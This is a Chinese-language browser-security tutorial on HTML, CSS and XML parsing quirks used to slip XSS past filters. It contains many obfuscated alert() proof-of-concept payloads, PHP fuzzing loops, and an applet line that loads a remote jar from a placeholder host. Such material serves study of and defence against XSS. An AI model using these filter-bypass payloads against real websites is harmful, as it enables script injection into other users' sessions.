# Browser Security-超文本标记语言（HTML）

#### 重要的4个规则：

```
1 &符号不应该出现在HTML的大部分节点中。
2 尖括号<>是不应该出现在标签内的，除非为引号引用。
3 在text节点里面，<左尖括号有很大的危害。
4 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。

```

#### 文件解析模式

在任何HTML文档中，最开始的`<!DOCTYPE>`用来指示浏览器需要解析的方式，同样也可使用`Content-Type`头来告诉浏览器。

一般情况下，浏览器中的解析器会尝试恢复大多数类型的语法错误，包括开始和结束标记。

在XML中，是非常严格的，所有标签必须有对应的开始关闭，也可以有自动关闭如<img/>也是允许的。

#### 了解HTML解析

[![](http://static.wooyun.org/20140918/2014091812393789842.jpeg)](http://static.wooyun.org/20141017/2014101716205670084.jpeg)

在IE浏览器中允许在1中插入NUL字符(0x00)，可以绕过非常多的xss过滤器。

如下php代码可把NUL字符插入标签内做测试：

2和4中的空格也可以由tab(0x0B)与换页键(0x0C)，2处也可以用/来代替。

5中的"在IE中也可替换成`。

IE当中还有一个特性是当遇到=后面紧跟一个引号的时候会有奇怪的解析。

```
<img src=test.jpg?value=">Yes, we are still inside a tag!">
<comment><img src="<comment><img src=x onerror=alert(1)//">

```

#### Entity编码

HTML解析器在建立文档树的时候会针对节点内的Entity编码解码后传输。

以下两个表示相同：

```
<img src="http://www.example.com"> 
<img src="ht&#x74;p&#x3a;//www.example.com">

```

下面两个例子代码不会执行，因为，编码的是标签本身的结构而非节点内的内容：

```
<img src&#x3d;"http://www.example.com"> 
<img s&#x72;c="http://www.example.com">

```

#### Fuzzing

对一个普通的HTML进行Fuzzing测试：

```
<a href="http://www.google.com/">Click me</a>

```

看一下可以Fuzzing的位置

| 位置 | 代码 | 可能插入或替代的代码 |
| --- | --- | --- |
| <的右边 | `<[here]a href="...` | 控制符，空白符，非打印字符 |
| a标签的后门 | `<a[here]href="...` | 同上 |
| href属性中间 | `<a hr[here]ef="...` | 同上+空字节 |
| =两边 | `<a href[here]=[here]"...` | 所有字符 |
| 替换= | `<a href[here]"...` | Union编码符号 |
| 替换" | `<a href=[here]…[here]>` | 其他引号 |
| >之前 | `<a href="…"[here]>` | 任意字符 |
| /之前 | `<a href="…">...<[here]/a>` | 空白符，控制符 |
| /之后 | `<a href="…">...</[here]a>` | 空白符，控制符 |
| >闭合之前 | `<a href="…">…</a[here]>` | 所有字符 |

可以使用php代码进行快速测试，例如我们对第一个位置（<的右边）进行Fuzzing：

```
<?php
for($i = 0; $i <= 255; $i++) {
$character = chr($i);
#  <右边进行测试
echo '<div><'.$character.'a href="http://www.google.com/">'.$i.'</a></div>'; } 
?>

```

上面的代码只测试了256个字符，如果想要测试Unicode的所有字符，则需要创建65536个链接。

php默认字符是ISO-8859-1作为默认的字符编码，而这种编码只有256个字符，所以单纯的循环65536遍是没用的。

所以采用Entity编码方式循环，解码后输出：

```
<?php
for($i = 0; $i <= 65535; $i++) {
$character = html_entity_decode('&#'.$i.';', ENT_QUOTES, 'UTF-8')
# <右边进行测试
echo '<div><'.$character.'a href="http://www.google.com/">'.$i.'</a></div>';
}?>

```

有一个有趣的现象是几乎所有浏览器对`$#33;`即`!`，浏览器会`<!`当成注释的开始，然后自动补齐剩下的代码，浏览器解析后的代码：

```
<div><!--a href="http://www.google.com/"-->33</div>

```

##### 针对标签名的Fuzzing：

```
<LԱ onclick=alert(1)>click me</LԱ>

```

上面的代码，在Chrom、Firefox和Safari中点击，可以顺利弹出1。

讨论一下空字符的问题，IE浏览器会自动忽略空字符，并解析剩下的代码，这样会绕过很多采用正则匹配黑名单字符串的过滤器。

并且，很多函数和库并没有意识到这个问题：

```
<?php 
echo '<im'.chr(0).'g sr'.chr(0).'c=x onerror=ale'.chr(0).'rt(1)>';
?>

```

用IE8打开上述代码的网页，查看源代码只能看到"<im"后面的字符都隐藏了。

还有两种方式可以对标签名Fuzzing，第一种是涉及字符集的问题，第二种是针对php中在过滤之前使用了utf8_decode()函数。

```
<?php
header('Content-Type: text/html;charset=Shift_JIS'); 
for($i = 1; $i <= 255; $i++) {    
    $character = html_entity_decode('&#'.$i.';', ENT_QUOTES, 'UTF-8');    
    $character = utf8_decode($character);    
    echo $character.'123456 '.$i."<br>\r\n";
} ?>

```

代码很简单，设置返回响应字符集为Shift_JIS，然后把utf-8转换为Shift_JIS字符集。

可以看到在IE中129-159和224-252中，123456中的1消失了，与前面的字符合并成一个字符了。

标签后面也可加入/符号做间隔：

```
<img/src=x onerror=alert(1)>

```

尝试在标签与/之间再插入其他字符来测试，由于空字符无法直观显示，所以用\0来表示null，同样主流浏览器都可以执行：

```
<img\0/src=x onerror=alert(1)>

```

再尝试ASCII码之外的字符，这种字符在正则表达式中\w是无法匹配到的，主流浏览器都可以执行：

```
<img/ \/\µ src=x onerror=alert(1)//>

```

测试发现，标签名与属性名直接只要是以/开头以/或"结尾，中间几乎可以插入任意字符。

在Fuzzing属性方面，考虑两方面，一个是可以使用什么分隔符，一个是属性值可以采用什么编码。

分隔符有很多种，单引号，双引号，无任何引号，反撇号（IE中）。

```
<?php
for($i = 1; $i <= 255; $i++) {
    $character = chr($i);
    echo '<div><font size='. $character. '20'. $character. '>'.$i.' </font></div>';
} ?>

```

上面代码可以直观的看出当前浏览器支持的分隔符有哪些字符。

上面代码size属性如果输入的是字符的话，会顺利执行，所以当$character中循环到数字的时候也会顺利解析，但这并非是把数字当成了分割符：

```
<?php
for($i = 20; $i <= 255; $i++) {
    $character = html_entity_decode('&#'.$i.';', ENT_QUOTES, 'UTF-8');
    echo '<div><img title="'.$i.'" src='.$character. 'http://www.google.com/intl/en_ALL/images/logo.gif'. $character. '></div>'; 
} ?>

```

以上代码可以看出，属性为字符串的时候，可以作为分隔符的字符。

为了表示那些不可打印的字符，就用`\x十六进制`来表示：

```
<img src=\x17\x17 onerror=alert(1)//>

```

以上代码\x17即表示不可打印字符chr(23)，浏览器提交的时候可以输入%3Cimg%20src%3D%17%17%20onerror%3Dalert%281%29%2f%2f%3E。

在src中可以正常工作的分隔字符，在处理事件的属性里不一定会工作，例如onerror。

但是仍然有一些字符可以达到我们的目的，ASCII表中的133和160已经IE中的空字符，甚至是分号。

```
<img/\%20src=%17y%17 onerror=%C2%A0alert(1)//>

```

以上代码urldecode之后在chrome中可以顺利执行。

下面讨论多个标签的问题，比如用户可控的数据插入到了`<input>`标签中，同时过滤了`<>`只能插入标签内数据：

```
<input value="" type=image src=1 onerror=alert(1)//" type="hidden" name="foo" />

```

绿色部分是我们插入的数据，又插入了一个type属性，但是浏览器执行了alert()，浏览器实际上会执行第一个属性，后面的会忽略掉。

在IE中还有一个lowsrc的属性，跟src类似，原本是为了方便调用一个缩略图的，但是在IE6和IE7中，同时也支持伪协议javascript:，还有一个dynsrc属性也类似：

```
<img lowsrc=1 onerror=alert(1)> // 所有IE都支持
<img lowsrc=javascript:alert(2)> //IE6和IE7支持
<img src="http://www.google.de/intl/de_de/images/logo.gif" dynsrc="javascript:alert(3)" /> // 只有IE6支持

```

sytle属性中还可以定义非常多的参数：

```
<span style="color:red" style="color:green;background:yellow"> foobar</span>

```

上面代码可以看到，浏览器显示的字体为红色，背景为黄色，除了定义颜色之外也可以用expression()执行js，后面会讨论。

还有一个属性是专门用来在一个标签中插入多个的：xmlns，XML的命名空间属性，这个后面会在XML中讨论。

还有一处可Fuzzing的点即为标签的关闭，一个有趣的现象是浏览器把`<br/>`与`</br>`，`<p/>`与`</p>`成完全一样。

```
<b > foobar</b style="x:expression(alert(1))"> // 不会执行alert
<b > foo</b > bar</b style="x:expression(alert(2))"> // IE执行了alert
<script src="http://0x.lv"></b> // 不会执行

```

可以执行的代码为没有开始标签的一个闭合标签，IE8中，sytle属性可以插在一个闭合标签内，并顺利执行。

可混淆的另一个方法是:可替换为=，下面例子在IE8中可执行：

```
<//style=x:expression(if(!window.x){window.x=1;alert(1);})> 
<//style='x=expr\65 ssion(if(!window.x){window.x=1;alert(1);})'> 
</a/style='x= \a expr\65 ss/*\&#x2a/ion(if(!window.x){window.x=1;alert(1);})'>

```

HTML代码中执行js的各种方式，用以下方式定义的时候，VBscript和JavaScript都可以执行。

```
<script language=vbs>
alert+1'VBScript
alert(2)// JavaScript 
</script>

```

也有利用标签中的属性来执行js，例如：onclick，onload，onerror等等。

在iframe标签中，不需要src属性就可以顺利执行onload属性，而img标签不可以。

这是因为在iframe中没有src属性的时候，浏览器会自动加载about:blank页面，即空白页。

附件tag.php可以方便的看到当前浏览器针对各标签在不需要用户交互的情况下，可以自动执行的所有属性。

[tag-event.php](http://static.wooyun.org/20141017/2014101716205735611.zip)

从输出结果可以看到body标签支持非常多的属性可以在与用户没有交互的情况下执行js。

例如load，error事件，所有的mouse和keyboard事件，以及在用户离开时的blur事件，还有unload和beforeunload，以及大家很少知道的pageshow属性。

同样标签中也有很少遇到的marquee标签：

```
<marquee onscroll=alert(1)>

```

在Chrome中，html标签也可以执行非常多的属性，，同源frameset标签也接受focus和blur事件。

一个很有趣的例子是，让scroll事件可以无交互触发，我们可以引入一个锚点，例如：

`<a name="bottom">`或者通过id属性`<div id="bottom">`

那我们可以访问http://test.com/test.html#bottom来访问，浏览器自动滚到该锚点，触发scroll属性。

```
<body onscroll="alert(1)">
<div style="height:10000px">some text</div>
<a name="bottom"></a>
</body>

```

1.html为以上代码，访问1.html#bottom会自动触发onscroll事件。

IE中hr标签中的onresize属性，在当前窗口大小变化时，会触发resize事件，执行alert(1)。

```
<hr onresize=alert(1)>

```

还有非常多的组合可以在IE中使用，很难全部列出来，只列举出几个很少见的例子：

```
<bgsound onpropertychange=alert(1)>
<body onpropertychange=alert(2)>
<body onmove=alert(3)>
<body onfocusin=alert(4)>
<body onbeforeactivate=alert(5)>
<body onactivate=alert(6)>
<embed onmove=alert(7)>
<object onerror=alert(8)>
<style onreadystatechange=alert(9) >
<xml onreadystatechange=alert(10) >
<xml onpropertychange=alert(11) >
<table><td background=javascript:alert(12) > 

```

除了以上on的各种属性之外，src和href属性由于支持javascript和vbscript（只支持IE）伪协议，所以也是可以执行javascript代码：

```
<a href="javascript:alert(1)">click me</a>
<a href="vbscript:alert(2)">click me</a>

```

代码执行时必须使用()，不可以使用vbscript中的alert+2，当点击之后，会弹出一个写在当前页面DOM中的数字2的警告框。

javascript:和vbscript:协议执行后的结果将会映射在DOM后面。

```
<a href="javascript:'\x3cimg src\x3dx onerror=alert(document.domain)>'">click me</a>

```

以上代码在IE和Firefox中点击click me之后可执行，并且可以看到弹出的domain为a标签中所在的domain。

以上代码需要用户交互，下面看个不需要用户交互的例子，使用object标签和data:标签：

```
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(2)</script > ">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg">

```

以上三个在Firefox中可执行，第二个可在Opera中执行，把各标签中各属性支持javascript的总结了一些：

```
<iframe src="javascript:alert(1)"> // 火狐，Chrome, IE8
<embed src="javascript:alert(2)"> // 火狐 
<img src="javascript:alert(4)"> // IE6
<image src="javascript:alert(5)"> // IE6
<body background="javascript:alert(5)"> // IE6 
<script src="javascript:alert(6)"> // IE6 
<table background="javascript:alert(7)"> // IE6 
<isindex type="image" src="javascript:alert(8)"> // IE6-7

```

以及applet标签中code和archive属性可以用来调用jar文件，执行java代码。

```
<applet code="XSS" archive="http://someserver.com/xss.jar"></applet>

```

Javascript可以通过DOM直接获取当前页面中对应的id和name属性的对象：

```
<html>
<body>
<div id="test"></div>
<script>alert(test)</script>
</body>
</html>

```

上面代码可以看出Javascript中并没定义test变量，但是获取到了页面中id为test的对象。

反过来，我们可以在外部直接控制Javascript变量，并且在一些浏览器中可以重写Javascript中已有的变量。

```
<html>
<body>
<form id="location" href="bar">
<script>alert(location.href)</script>
</body>
</html>

```

以上代码在IE中可以看到弹出的bar，而不是当前页面的url，成功覆盖了原本的变量。

还有一种利用meta标签来执行Javascript：

```
<meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)">

```

上面代码可以在Chrome，Opera，IE6中可执行javascript代码，并且弹出的时meta标签所在的域。

如果禁止了javascript:协议，也可使用data:协议，不过能够顺利执行javascript并且继承meta标签域的测试到的只有Opera。

```
<meta http-equiv="refresh" content="0; url=data:text/html,<script>alert(document.domain)</script>">

```

IE中为了兼容各个版本，所以有一个条件注释的语法，这个语法其他浏览器并不支持，会自动当成html注释。

```
<!--[if IE 8]>
<p>Welcome to Internet Explorer 8.</p> 
<![endif]-->

```

如上文字只有在IE8中才会显示，条件注释对于开发是一件很好的事情，可以方便的判断浏览器版本获取兼容代码展现给用户。

```
<!--[if gte IE 7]><p>You are using IE 7 or greater.</p><![endif]-->
<!--[if (IE 5)]><p>You are using IE 5 (any version).</p><![endif]-->
<!--[if (gte IE 5.5)&(lt IE 7)]><p>You are using IE 5.5 or IE 6.</p><![endif]-->
<!--[if lt IE 5.5]><p>Please upgrade your version of Internet Explorer.</p><![endif]-->
<!--[if lt Contoso 2]>
<p>Your version of the Contoso control is out of date; please update to the latest.</p>
<![endif]-->
<![if IE 8.0] >
<script > alert(1)</script >  //只在IE8下执行
<![endif] >
<![if IE 8.0000000000000000]]] >
<script > alert(2)</script >  // IE8同样执行
<![endif] >
<![if IE 8.0000000000000000?] >
<script > alert(3)</script >  // 所有的IE都执行
<![endif] > 

```

同时IE还支持另外一种方法来执行条件语句，就是通过标签，并且标签之间的代码并不会执行，但是其他浏览器却会执行。

```
<comment><img src=x onerror=alert(3)><comment>
<comment onclick=alert(1)>XXX--> //Opera不执行

```

IE的JS引擎里同样也有条件注释的语法：

```
<script>
//@cc_on!alert(1)
/*@cc_on~alert(2)@*/
</script>

```

前面提到过标签属性中的URI可以做entity编码，同时，javascript:后面也可以做url编码，下面代码在所有浏览器中都可以成功执行。

```
<a href="j&#x61vascript:%61lert(1)">click me</a>

```

同时后面的url编码可以再做一次entity编码：

```
<a href="j&#x61vascript:&#x25;61lert(1)">click me</a>

```

由于entity编码允许&#之后插入任意多个0，再利用上javascript的注释混淆后：

```
<a href="j&#x61vascript: //%0&#x61 &#x00025;61lert(1)">click me</a>

```

base标签定义当前页面链接默认地址或默认目标，下面代码在opera中可执行：

```
<base href="javascript:alert(1)"/>
<a href="#">click me</a>

```

javascript也可以换行分割（在IE与chrome中可执行alert）：

```
<a href="j&#x61v
ascript: //%0&#x61 &#x00025;61lert(1)">click me</a>

```

换行字符同时也可以使用entity编码：

```
<a href="j&#x61va&#x000Ascript://%0&#x61&#x00025;61lert(1)"> click me</a>

<?php
for($i = 0; $i<=65535; $i++) {
    $chr = html_entity_decode('&#'.$i.';', ENT_QUOTES, 'UTF-8'0);
    echo '<iframe src="java'.$chr.'script:alert('.$i.')"></iframe> <br/>';
} ?>

```

上面代码可测出当前浏览器中，javascript字符串插入哪些字符仍然可以执行alert。

```
<a href="data:text/html;charset=utf-8;base64, PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+Og=="> click</a>

```

上面代码在Firefox和Opera中可以弹出当前域，Chrome与Safari可以弹，但是继承不到a标签所在的域，弹出为空，IE不能执行。

Firefox中data:协议默认MIME类型为text/html，即使你定义了一个他根本不知道的类型，他也会把它当作text/html类型：

```
<iframe src="data:µ,<script>alert(1)</script>"> </iframe>
<iframe src="data:&#ffff;,<script>alert(2)</script>"></iframe>

```

利用之前总结的结论，最终可以写出下面可让Firefox执行的代码：

```
<iframe/
\/src="data:µ,%3cscript%3ealert(document.dom&#x25;61in+[])%3c/script%3e"> </iframe>

```

并且火狐中会忽略data:协议中的所有空白字符：

```
<iframe src="data:.&#x2c &#x25;
3
cscri pt%
3 e alert(1)
%3c /s &#x43 RIP t>">

```

最终可以混淆成这样：

```
<iframe src="d&#097t&#x0061:. &#x2c &#x25; 3
c s cri &#x00D; pt %
3 e al\u0065rt(1)
%3c /s &#x43 RI &#x009 P t>"
data:%,<b> < s &#10 c r i p t>alert(1) < /s &#10 c r i p t>

```

之前提到的标签，在IE中data:协议都不能执行javascript，但是在style标签里，可以通过@import命令插入data:执行javascript：

```
<style>
@import "data:,*%7bx:expression(write(1))%7D";
</style>
<style>
@imp\ ort"data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d"; </style>
<style>
<link rel="Stylesheet" href="data:,*%7bx:expression(write(3))%7d">

```

下面讨论一下事件即onload、onerror等事件之后的混淆方法：

```
<body onload="al&#000101rt&#8233
/*&#00*/(document. dom&#x5cu0061in)//">

```

采用了entity编码，最后一处是先使用javascript的unicode编码，然后再entity编码。

由于是直接处理DOM的方法和对象，与直接在script标签内处理字符串的环境还是不同，但是我们可以加注释或者换行符。

```
<body onload="al&#000101rt&#8233
//&#x0d/*&#00*/(document. dom&#x5cu0061in)//">

```

当使用location重定向到javascript:伪协议url的时候，又可以多做一重编码了：

```
<body/:a/onload="location='j&#97vAscript:'
+&#x28[&#x5d+
'\141\l\u0065rt\r\(/*&#x2a/docum%65nt.dom\x&#x0032;561in)'
)">

```

事件同时又可以直接调用其他属性：

```
<img src="x" onload="alert(1)" onerror="this.onload()">
<img/src="*/(1)"title="alert/*"onerror="eval(title+src)">

```

style属性的混淆，一个没有任何混淆的简单例子：

```
<input type="text" value="" style=display:block;position:absolute;top:0;left:0;width:999em; height:999em onmouseover=alert(1) a="" name="foo" />

```

利用之前总结的在属性里的混淆方法：

```
<l1!/style="-:\65 \x/**/\p\r\0&#x30;0065 /**/ssio\n(write /**&#x2f(dom\u0061in))"> 

```

在expression中，我们可以直接访问document中的write方法和domain属性，这表明我们当前位于document的DOM范围内。

```
<l1!/style="-:\65 \x/**/\p\r\0&#x30;0065 /**/ssio\n(location='j&#97vAscript:'+&#x28[&#x5d+'document.write\r\(/*&#x2a/1)'))"> 

```

转到javascript的URL时，已不在document当中，访问write方法时需要使用document.write。

看到有\xx和\xxxxxx的Unicode编码，这些都是CSS编码，与JavaScript编码非常相似。

下面两个URL中列举了一些浏览器对各种奇怪的css语法支持情况：

[http://imfo.ru/csstest/css_hacks/import.php](http://imfo.ru/csstest/css_hacks/import.php)[http://centricle.com/ref/css/filters/](http://centricle.com/ref/css/filters/)

在IE中，css的解析非常的宽泛：

```
<style>
/*\*/*{x:expression(write(1))/*
</style>
<style>
_{content:"\"/*" x}
*{0:expression(write(2))
</style>
<a style=<!---/**/&#61expression(write(3))/*-- > X</a > 

```

从IE5.5到IE8中，除了expression可以用来执行JavaScript之外，也可以通过HTML+TIME的形式。

这种方式唯一的缺点就是也需要一个事件来执行JavaScript，即onbegin或者onend：

```
1<l style="behavior:url(#default#time2)"onbegin="alert(1)">

```

还有一种方式利用set标签：

```
1<set/xmlns="urn:schemas-microsoft-com:time" style="beh&#x41vior:url(#default#time2)" attributename="innerhtml" to="&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;">

```

测试一下style属性中在哪些浏览器中，可以插入哪些字符：

```
<?php
for($i = 0; $i<=65535; $i++) {
    $chr = html_entity_decode('&#'.$i.';', ENT_QUOTES, 'UTF-8');
    echo '<a style="color='.$chr.'red">'.dechex($i).'['.$chr.']</a>';
} ?>

```

从测试结果可以得出，下面的代码可以在IE中执行：

```
<div style=xss&#x2000;:&#x3000;expression(write(1))>

```

在一些老版本的IE中，如IE6和IE7，还可以通过背景相关属性调用javascript的URL来执行javascript代码：

```
<b style="background:url(javascript:alert('background'))">xxx</b> 
<b style="background-image:url(javascript:alert('background'))"> xxx</b>
<b style="list-style:url(javascript:alert('background'))">xxx</b> 
<b style="list-style-image:url(javascript:alert('background'))"> xxx</b>

```

通过link标签（在IE6下适用，同时javascript可以换成vbscript）：

```
<link rel="stylesheet" href="javascript:alert(1)">
<link rel="stylesheet" href="vb&#x09script:%61lert(document.domain)">

```

style标签中可以通过导入url的方式执行javascript：

```
<style>
@imp\o\ rt url('javascript:%61lert(2)'); 
</style>

```

HTML5中增加了很多标签跟属性，列举一些可执行JavaScript的方法：

```
<form><input><output onforminput="alert(1)"> //Opera支持

```

onfocus与autofocus的配合：

```
<input onfocus=write(domain) autofocus>
<keygen onfocus=write(domain) autofocus>
<textarea onfocus=write(domain) autofocus>
<body onfocus=write(domain) autofocus>
<frameset onfocus=write(domain) autofocus>
<button onfocus=write(domain) autofocus>
<input autofocus onblur=write(domain)><input autofocus> //Chrome中无交互执行
<iframe/src=javascript:alert(1)>
<video/poster=javascript:alert(2)>
<button form="test" formaction="javascript:alert(3)">

```

更多的html5攻击方式请见：[http://html5sec.org/](http://html5sec.org/)

XML内容比较少，就一起写到HTML里了，XML支持Unicode，所以Unicode里的所有字符都可以用来做标签或者属性，同时有可能绕过<\w+匹配：

```
<啊 onclick="alert(1)" xmlns="http://www.w3.org/1999/xhtml">XXX</啊>

```

XML相比HTML最严格的就是有了开始的标签，必须要有结束标签匹配，否则会报错。

但是在大多数浏览器中似乎并不会影响页面中javascript的解析（IE中不执行）：

```
<html xmlns="http://www.w3.org/1999/xhtml"> 
<script>
alert(1); // works
</script>
<p>
<script>
alert(2); // works too 
</script>
</html>

```

甚至可以通过JavaScript修改错误页面的内容（在Firefox中可执行）：

```
<html xmlns="http://www.w3.org/1999/xhtml"> 
<p>
<script>
setTimeout(function(){ document.activeElement.textContent='hello world' },1);
</script>
</html>

```

XML的编码规范与HTML非常相似，可以用entity编码属性值。 在XML中，我们可以在DOCTYPE中自定义entity，甚至通过URL引入外部文件：

```
<!DOCTYPE xss [<!ENTITY x "&#x61;l&#x26;y;"><!ENTITY y "ert">]>
<html xmlns="http://www.w3.org/1999/xhtml">
<script>&x;(document.domain);</script>
</html>

```

上面代码定义了一个&y变量为"ert"，&x为"al&y"（a与&符号编码了一下），即alert，

```
<!DOCTYPE xss [<!ENTITY _k "&#x61;l&#x26;__;"><!ENTITY __ "ert" > ]>
<script xmlns="http://www.w3.org/1999/xhtml">
&lt;!--&#10;&_k;(1&#x000029;
</script>

```

在xml中，包括script标签内的代码浏览器都会entity解码后执行，这点很有用：

```
<script xmlns="http://www.w3.org/1999/xhtml">
a='&#x27;,alert(1)//';
b='&#39;,alert(2)//';
c='&apos;,alert(3)//';
</script>

```

从5.5版本开始，Internet Explorer（IE）开始支持Web 行为的概念。

这些行为是由后缀名为.htc的脚本文件描述的，它们定义了一套方法和属性，几乎可以把这些方法和属性应用到HTML页面上的任何元素上去。

HTML中可以通过加载CSS的behavior的方式调用htc文件，仅支持同域调用：

```
//HTML文件代码：
<html>
<head>
<style>body { behavior: url(test.htc);}</style> </head>
<body>Hello</body>
</html>
//htc文件代码：
<PUBLIC:COMPONENT>
<PUBLIC:ATTACH EVENT="onclick" ONEVENT="alert(1)" />
</PUBLIC:COMPONENT>

```

同样HTML调用XML文件执行javascript：

```
<html>
<body>
<xml id="xss" src="test.xml"></xml>
<label dataformatas=html datasrc=#xss datafld=payload></label> </body>
</html>
<?xml version="1.0"?>
<x>
<payload>
<![CDATA[<img src=x onerror=alert(domain)>]]> </payload>
</x>

```

dataformatas定义了获取到的数据以什么格式解析（HTML或text），datasrc指绑定的id，datafld指使用哪一段数据。

svg调用javascript（新版本的几个浏览器支持）：

```
<svg xmlns="http://www.w3.org/2000/svg">
<g onload="alert(1)"></g>
</svg>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(2)"></svg>
```